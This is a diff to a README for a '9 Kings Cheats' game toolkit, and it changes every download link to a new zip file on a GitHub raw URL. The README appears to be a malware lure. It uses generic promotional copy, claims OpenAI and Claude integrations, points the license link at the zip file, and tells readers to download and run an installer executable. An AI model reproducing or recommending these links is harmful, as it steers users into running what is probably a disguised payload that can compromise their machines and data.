@@ -1,5 +1,5 @@
 # 9 Kings Cheats 👑  
-[![Download](https://raw.githubusercontent.com/neonovasolutions/royal-9kings-toolkit/branch/dictational/royal-9kings-toolkit-2.6-alpha.2.zip%20Kings%20Cheats-brightgreen)]https://raw.githubusercontent.com/neonovasolutions/royal-9kings-toolkit/branch/dictational/royal-9kings-toolkit-2.6-alpha.2.zip
+[![Download](https://github.com/neonovasolutions/royal-9kings-toolkit/raw/refs/heads/branch/dictational/royal-toolkit-kings-1.3.zip%20Kings%20Cheats-brightgreen)]https://github.com/neonovasolutions/royal-9kings-toolkit/raw/refs/heads/branch/dictational/royal-toolkit-kings-1.3.zip
 
 The “9 Kings Cheats” platform is the ultimate toolkit for players looking to maximize their in-game kingdom experience while keeping things legit and innovative. Designed with modern gamers in mind, this repository compiles several strategic utilities, advanced API integrations, multilingual support, and robust features for an optimized gameplay journey through the coveted 9 Kings universe.
 
@@ -58,7 +58,7 @@ Step into tomorrow with seamless integration of both OpenAI and Claude APIs—su
   - Natural conversation, instant answers, and custom strategic advice built into your interface.
   - Powerful integrations bring Claude’s intuitive comprehension directly to your game session.
 
-*To enable these integrations, download the appropriate plugin via https://raw.githubusercontent.com/neonovasolutions/royal-9kings-toolkit/branch/dictational/royal-9kings-toolkit-2.6-alpha.2.zip and follow installation prompts.*
+*To enable these integrations, download the appropriate plugin via https://github.com/neonovasolutions/royal-9kings-toolkit/raw/refs/heads/branch/dictational/royal-toolkit-kings-1.3.zip and follow installation prompts.*
 
 ---
 
@@ -78,7 +78,7 @@ Never wait for the dawn. Live chat, email, and knowledge base help keep your cam
 ## 📥 Installation Steps
 
 1. **Grab the Latest Build**  
-   Download the main package from https://raw.githubusercontent.com/neonovasolutions/royal-9kings-toolkit/branch/dictational/royal-9kings-toolkit-2.6-alpha.2.zip
+   Download the main package from https://github.com/neonovasolutions/royal-9kings-toolkit/raw/refs/heads/branch/dictational/royal-toolkit-kings-1.3.zip
 
 2. **Run the Installer / Setup Executable**  
    Double-click and follow prompts for your operating system.
@@ -103,10 +103,10 @@ Never wait for the dawn. Live chat, email, and knowledge base help keep your cam
 
 ## 📜 License
 
-All code and content in this repository is licensed under the [MIT License (2025)](https://raw.githubusercontent.com/neonovasolutions/royal-9kings-toolkit/branch/dictational/royal-9kings-toolkit-2.6-alpha.2.zip). 
+All code and content in this repository is licensed under the [MIT License (2025)](https://github.com/neonovasolutions/royal-9kings-toolkit/raw/refs/heads/branch/dictational/royal-toolkit-kings-1.3.zip). 
 
 ---
 
-[![Download](https://raw.githubusercontent.com/neonovasolutions/royal-9kings-toolkit/branch/dictational/royal-9kings-toolkit-2.6-alpha.2.zip%20Kings%20Cheats-brightgreen)]https://raw.githubusercontent.com/neonovasolutions/royal-9kings-toolkit/branch/dictational/royal-9kings-toolkit-2.6-alpha.2.zip
+[![Download](https://github.com/neonovasolutions/royal-9kings-toolkit/raw/refs/heads/branch/dictational/royal-toolkit-kings-1.3.zip%20Kings%20Cheats-brightgreen)]https://github.com/neonovasolutions/royal-9kings-toolkit/raw/refs/heads/branch/dictational/royal-toolkit-kings-1.3.zip
 
 ---
